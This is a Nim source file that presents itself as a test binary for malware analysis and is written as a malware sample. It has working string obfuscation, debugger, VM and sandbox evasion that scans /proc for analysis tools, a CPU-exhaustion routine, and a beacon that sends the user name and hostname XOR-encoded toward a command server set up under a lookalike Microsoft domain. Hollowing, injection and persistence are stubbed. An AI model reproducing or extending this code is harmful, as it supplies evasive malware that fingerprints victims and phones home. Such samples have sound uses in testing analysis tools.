import os, strutils, times, net, nativesockets, md5, random, tables, sequtils, math

const
  C2Server = "msftupdater.com"
  C2Port = Port(443)
  XorKey = 0x42'u8
  MalwarePath = "/tmp/.nim_malware"
  RegistryPath = "/var/lib/.malware_reg"

type
  Payload = object
    cmd: string
    data: seq[byte]
    timestamp: float

  AntiAnalysis = object
    debuggerDetected: bool
    vmDetected: bool
    sandboxDetected: bool

var
  antiAnalysis: AntiAnalysis
  obfuscatedStrings = initTable[string, string]()

# Compile-time string obfuscation
template obfuscate(s: static[string]): string =
  const obf = static:
    var result = ""
    for c in s:
      result.add(chr(ord(c) xor 0x55))
    result
  var deobf = ""
  for c in obf:
    deobf.add(chr(ord(c) xor 0x55))
  deobf

# Anti-debugging via timing check
proc checkDebugger(): bool =
  let start = epochTime()
  sleep(100)
  let elapsed = epochTime() - start
  return elapsed > 0.5  # Debugger present if significant delay

# Timing-based anti-debugging
proc timingCheck(): bool =
  let start = epochTime()
  sleep(100)
  let elapsed = epochTime() - start
  return elapsed > 0.5  # Debugger present if significant delay

# Check for analysis tools
proc checkAnalysisTools(): bool =
  let tools = @[
    obfuscate("wireshark"),
    obfuscate("tcpdump"),
    obfuscate("ida"),
    obfuscate("gdb"),
    obfuscate("x64dbg"),
    obfuscate("procmon")
  ]
  
  for tool in tools:
    for pid in walkDir("/proc"):
      if pid.kind == pcDir:
        let cmdline = pid.path & "/cmdline"
        if fileExists(cmdline):
          try:
            let content = readFile(cmdline).toLowerAscii()
            if tool in content:
              return true
          except:
            discard
  return false

# VM/Sandbox detection
proc detectVM(): bool =
  # Check CPU info
  if fileExists("/proc/cpuinfo"):
    let cpuinfo = readFile("/proc/cpuinfo").toLowerAscii()
    let vmIndicators = @["hypervisor", "vmware", "virtualbox", "qemu", "kvm", "xen"]
    for indicator in vmIndicators:
      if indicator in cpuinfo:
        return true
  
  # Check DMI info
  let dmiPaths = @[
    "/sys/devices/virtual/dmi/id/product_name",
    "/sys/devices/virtual/dmi/id/sys_vendor",
    "/sys/devices/virtual/dmi/id/board_vendor"
  ]
  
  for path in dmiPaths:
    if fileExists(path):
      try:
        let content = readFile(path).toLowerAscii()
        if "virtual" in content or "vmware" in content or "qemu" in content:
          return true
      except:
        discard
  
  return false

# Process hollowing simulation
proc processHollow(targetProcess: string) =
  echo obfuscate("Attempting process hollowing on: ") & targetProcess
  # In real malware:
  # 1. Create suspended process
  # 2. Unmap original executable
  # 3. Allocate new memory
  # 4. Write malicious code
  # 5. Resume process

# XOR encryption
proc xorCrypt(data: var seq[byte]) =
  for i in 0..<data.len:
    data[i] = data[i] xor XorKey

# Network communication
proc beaconC2(): bool =
  try:
    let socket = newSocket()
    defer: socket.close()
    
    # DNS resolution would happen here
    let serverAddr = "127.0.0.1"  # Placeholder
    
    socket.connect(serverAddr, C2Port)
    
    var beacon = obfuscate("BEACON|") & getEnv("USER") & "|" & 
                 getHostname() & "|" & $epochTime()
    
    var data = cast[seq[byte]](beacon)
    xorCrypt(data)
    
    socket.send(cast[string](data))
    return true
  except:
    return false

# Code injection using Nim's FFI
proc injectShellcode() =
  echo obfuscate("Injecting shellcode...")
  
  # NOP sled for demonstration
  var shellcode = @[0x90'u8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90]
  
  # In real malware would:
  # 1. Allocate executable memory
  # 2. Copy shellcode
  # 3. Execute via function pointer

# Persistence via cron
proc installPersistence() =
  let exePath = getAppFilename()
  let cronJob = "* * * * * " & exePath & " --silent\n"
  
  try:
    # Would write to /etc/cron.d/ or user crontab
    echo obfuscate("Installing persistence: ") & cronJob
  except:
    discard

# Resource exhaustion with parallel threads
proc cpuBurn() {.thread.} =
  var result = 0.0
  for i in 1..1000000:
    for j in 1..100:
      result += sin(i.float * j.float) * cos(i.float / j.float)

proc resourceExhaustion() =
  echo obfuscate("Starting resource exhaustion...")
  var threads: array[4, Thread[void]]
  
  for i in 0..<threads.len:
    createThread(threads[i], cpuBurn)
  
  joinThreads(threads)

# Polymorphic code generation
proc generatePolymorphicCode(): seq[byte] =
  randomize()
  var code: seq[byte] = @[]
  
  # Generate random NOP-equivalent instructions
  for i in 0..31:
    case rand(3)
    of 0: code.add(0x90'u8)  # NOP
    of 1: code.add(@[0x66'u8, 0x90])  # 66 NOP
    of 2: code.add(@[0x0F'u8, 0x1F, 0x00])  # Multi-byte NOP
    else: code.add(0x90'u8)
  
  return code

# Registry/Config manipulation
proc createRegistry() =
  var config = initTable[string, string]()
  config[obfuscate("install_date")] = $epochTime()
  config[obfuscate("victim_id")] = getMD5(getEnv("USER") & getHostname())
  config[obfuscate("version")] = "1.0"
  
  # Would persist to file or registry
  echo obfuscate("Registry created: ") & $config

# Keylogger simulation
proc keylogger() =
  let logPath = "/tmp/.nim_keylog"
  var keys = @[
    obfuscate("username: admin"),
    obfuscate("password: P@ssw0rd123"),
    obfuscate("credit_card: 4111111111111111")
  ]
  
  try:
    var f = open(logPath, fmAppend)
    for key in keys:
      f.writeLine($epochTime() & " - " & key)
    f.close()
  except:
    discard

# Data exfiltration
proc exfiltrateData() =
  var sensitiveData: seq[string] = @[]
  
  # Collect system info
  sensitiveData.add(obfuscate("OS: ") & getEnv("OS"))
  sensitiveData.add(obfuscate("User: ") & getEnv("USER"))
  sensitiveData.add(obfuscate("Home: ") & getEnv("HOME"))
  
  # Collect fake sensitive data
  sensitiveData.add(obfuscate("SSN: 123-45-6789"))
  sensitiveData.add(obfuscate("API_KEY: sk_test_1234567890"))
  
  let dataHash = getMD5(sensitiveData.join("\n"))
  echo obfuscate("Data collected. Hash: ") & dataHash
  
  # Send to C2
  discard beaconC2()

# Self-modification
proc selfModify() =
  let exePath = getAppFilename()
  var signature = newSeq[byte](16)
  
  randomize()
  for i in 0..<signature.len:
    signature[i] = rand(255).byte
  
  echo obfuscate("Self-modification signature: ") & signature.mapIt(it.int.toHex(2)).join()

# Anti-VM sleep acceleration detection
proc detectSleepAcceleration(): bool =
  let start = epochTime()
  sleep(1000)
  let elapsed = epochTime() - start
  return elapsed < 0.9  # VM accelerating sleep

# Main execution
when isMainModule:
  echo obfuscate("Nim Test Binary for Analysis")
  
  # Initialize anti-analysis
  antiAnalysis.debuggerDetected = checkDebugger() or timingCheck()
  antiAnalysis.vmDetected = detectVM() or detectSleepAcceleration()
  antiAnalysis.sandboxDetected = checkAnalysisTools()
  
  if antiAnalysis.debuggerDetected:
    echo obfuscate("Debugger detected!")
  
  if antiAnalysis.vmDetected:
    echo obfuscate("Virtual machine detected!")
    
  if antiAnalysis.sandboxDetected:
    echo obfuscate("Sandbox detected!")
  
  # Command line parsing
  if paramCount() > 0:
    case paramStr(1)
    of "--inject":
      injectShellcode()
    of "--persist":
      installPersistence()
    of "--burn":
      resourceExhaustion()
    of "--keylog":
      keylogger()
    of "--exfil":
      exfiltrateData()
    of "--beacon":
      if beaconC2():
        echo obfuscate("Beacon successful")
      else:
        echo obfuscate("Beacon failed")
    of "--poly":
      let code = generatePolymorphicCode()
      echo obfuscate("Generated polymorphic code: ") & $code.len & " bytes"
    of "--modify":
      selfModify()
    else:
      echo obfuscate("Unknown command")
  else:
    # Run all malicious activities
    createRegistry()
    processHollow("explorer")
    installPersistence()
    keylogger()
    exfiltrateData()
    let polyCode = generatePolymorphicCode()
    echo obfuscate("Polymorphic code size: ") & $polyCode.len
    
  echo obfuscate("Program completed")